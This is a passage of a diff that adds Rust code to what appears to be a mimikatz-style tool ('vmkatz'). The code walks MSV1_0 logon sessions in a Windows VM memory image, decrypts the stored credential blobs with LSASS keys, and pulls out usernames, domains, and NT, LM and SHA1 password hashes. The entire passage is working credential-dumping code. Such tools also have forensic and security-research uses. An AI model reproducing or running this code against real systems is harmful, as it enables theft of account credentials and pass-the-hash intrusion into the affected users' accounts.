+    let variants = MSV_OFFSET_VARIANTS_X86;
+
+    // Find list in .data
+    let data_sec = pe.find_section(".data").ok_or_else(|| {
+        VmkatzError::PatternNotFound(".data section in msv1_0.dll".to_string())
+    })?;
+    let data_base = msv_base + data_sec.virtual_address as u64;
+    let data_size = std::cmp::min(data_sec.virtual_size as usize, 0x10000);
+    let data = vmem.read_virt_bytes(data_base, data_size)?;
+
+    for off in (0..data_size.saturating_sub(8)).step_by(4) {
+        let flink = super::types::read_u32_le(&data, off).unwrap_or(0) as u64;
+        let blink = super::types::read_u32_le(&data, off + 4).unwrap_or(0) as u64;
+        let list_addr = data_base + off as u64;
+
+        if flink == list_addr && blink == list_addr { continue; }
+        if !is_valid_user_ptr(flink, arch) || !is_valid_user_ptr(blink, arch) { continue; }
+        if flink >= msv_base && flink < msv_base + 0x100000 { continue; }
+
+        for variant in variants {
+            let mut current = flink;
+            let mut visited = std::collections::HashSet::new();
+            let mut variant_results = Vec::new();
+
+            while current != list_addr && !visited.contains(&current) && current != 0 {
+                visited.insert(current);
+
+                let luid = vmem.read_virt_u64(current + variant.luid).unwrap_or(0);
+                if luid == 0 || luid > 0xFFFF_FFFF { break; }
+
+                let username = read_ustring(vmem, current + variant.username, arch).unwrap_or_default();
+                if username.is_empty() || username.len() > 256 {
+                    current = read_ptr(vmem, current + variant.flink, arch).unwrap_or(0);
+                    continue;
+                }
+
+                // Try to get credentials pointer (if available)
+                if variant.credentials_ptr > 0 {
+                    let cred_ptr = read_ptr(vmem, current + variant.credentials_ptr, arch).unwrap_or(0);
+                    if is_valid_user_ptr(cred_ptr, arch) {
+                        // The credential structure starts with a linked list entry, then the encrypted blob
+                        // Try to find and decrypt Primary credential
+                        if let Some(msv_cred) = try_extract_primary_cred_x86(vmem, cred_ptr, keys, arch) {
+                            variant_results.push((luid, msv_cred));
+                        }
+                    }
+                } else {
+                    // Auto-detect: scan entry for credentials pointer
+                    for scan_off in (0x40..0x100).step_by(4) {
+                        let ptr = read_ptr(vmem, current + scan_off, arch).unwrap_or(0);
+                        if !is_valid_user_ptr(ptr, arch) { continue; }
+                        if let Some(msv_cred) = try_extract_primary_cred_x86(vmem, ptr, keys, arch) {
+                            variant_results.push((luid, msv_cred));
+                            break;
+                        }
+                    }
+                }
+
+                current = read_ptr(vmem, current + variant.flink, arch).unwrap_or(0);
+            }
+
+            if !variant_results.is_empty() {
+                log::info!("MSV x86: extracted {} credentials", variant_results.len());
+                return Ok(variant_results);
+            }
+        }
+    }
+
+    log::info!("MSV x86: no credentials found");
+    Ok(Vec::new())
+}
+
+/// Try to extract MSV Primary credential from a credentials pointer on x86.
+fn try_extract_primary_cred_x86(
+    vmem: &dyn VirtualMemory,
+    cred_ptr: u64,
+    keys: &CryptoKeys,
+    arch: Arch,
+) -> Option<MsvCredential> {
+    // The credential structure has a linked list of credential types.
+    // Each has: flink(4B), blink(4B), then ANSI_STRING AuthenticationPackageId,
+    // then ANSI_STRING PrimaryCredentialData.
+    // We need to find "Primary" and decrypt the associated blob.
+
+    // Try direct primary scan: look for UNICODE_STRING with encrypted data
+    // Read first few candidates
+    for offset in &[0x08u64, 0x0C, 0x10, 0x14, 0x18, 0x1C, 0x20, 0x24] {
+        let next_ptr = read_ptr(vmem, cred_ptr + offset, arch).unwrap_or(0);
+        if !is_valid_user_ptr(next_ptr, arch) { continue; }
+
+        // Check if this is a credentials struct: try to read encrypted blob
+        // Layout: primary_ptr -> { UNICODE_STRING Length/MaxLength/Buffer }
+        let enc_len = vmem.read_virt_u16(next_ptr).unwrap_or(0) as usize;
+        let enc_max = vmem.read_virt_u16(next_ptr + 2).unwrap_or(0) as usize;
+        let enc_buf_ptr = read_ptr(vmem, next_ptr + arch.ptr_size(), arch).unwrap_or(0);
+
+        if enc_len == 0 || enc_max == 0 || !is_valid_user_ptr(enc_buf_ptr, arch) { continue; }
+        if !(0x30..=0x800).contains(&enc_max) { continue; }
+
+        let read_len = if enc_max >= enc_len { enc_max } else { enc_len };
+        let enc_data = match vmem.read_virt_bytes(enc_buf_ptr, read_len) {
+            Ok(d) => d,
+            Err(_) => continue,
+        };
+
+        if let Ok(dec) = crate::lsass::crypto::decrypt_credential(keys, &enc_data) {
+            if dec.len() >= 0x40 {
+                // Try each PRIMARY_CRED_OFFSET_VARIANTS to find valid hashes
+                for pcov in PRIMARY_CRED_OFFSET_VARIANTS {
+                    if pcov.nt_hash + 16 > dec.len() { continue; }
+                    let nt_hash: [u8; 16] = dec[pcov.nt_hash..pcov.nt_hash + 16].try_into().ok()?;
+                    if nt_hash.iter().all(|&b| b == 0) { continue; }
+
+                    let lm_hash = if pcov.lm_hash + 16 <= dec.len() {
+                        dec[pcov.lm_hash..pcov.lm_hash + 16].try_into().unwrap_or([0u8; 16])
+                    } else { [0u8; 16] };
+
+                    let sha1_hash = if pcov.sha1_hash + 20 <= dec.len() {
+                        dec[pcov.sha1_hash..pcov.sha1_hash + 20].try_into().unwrap_or([0u8; 20])
+                    } else { [0u8; 20] };
+
+                    // Read username/domain from decrypted blob header
+                    // x86 blob header: LogonDomainName(8B) + UserName(8B) at start
+                    let domain = vmem.read_win_unicode_string_32(next_ptr as u64).ok()
+                        .or_else(|| {
+                            // Try from blob: first 8B is domain UNICODE_STRING
+                            let buf_ptr_raw = super::types::read_u32_le(&dec, 4).unwrap_or(0) as u64;
+                            if is_valid_user_ptr(buf_ptr_raw, arch) {
+                                vmem.read_win_unicode_string_raw(buf_ptr_raw, super::types::read_u16_le(&dec, 0).unwrap_or(0) as usize).ok()
+                            } else { None }
+                        })
+                        .unwrap_or_default();
+                    let username_blob = super::types::read_u16_le(&dec, 8).unwrap_or(0) as usize;
+                    let username_ptr = super::types::read_u32_le(&dec, 12).unwrap_or(0) as u64;
+                    let username = if is_valid_user_ptr(username_ptr, arch) && username_blob > 0 {
+                        vmem.read_win_unicode_string_raw(username_ptr, username_blob).unwrap_or_default()
+                    } else { String::new() };
+
+                    return Some(MsvCredential {
+                        username,
+                        domain,
+                        nt_hash,
+                        lm_hash,
+                        sha1_hash,
+                    });
+                }
+            }
+        }
+    }
+
+    None
 }
